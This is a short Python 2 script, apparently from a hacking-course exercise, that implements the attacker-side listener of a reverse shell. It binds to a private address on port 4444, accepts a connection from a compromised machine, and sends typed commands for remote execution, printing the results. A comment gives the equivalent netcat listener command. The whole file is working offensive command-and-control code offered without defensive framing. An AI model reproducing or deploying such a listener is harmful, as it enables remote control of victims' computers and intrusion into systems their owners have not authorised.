import socket


# nc -vv -l -p 4444

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def start(self):
        while True:
            command = raw_input(">> ")
            if command == "exit":
                break
            result = self.execute_remotely(command)
            print(result.decode())


my_listener = Listener("192.168.233.135", 4444)
my_listener.start()
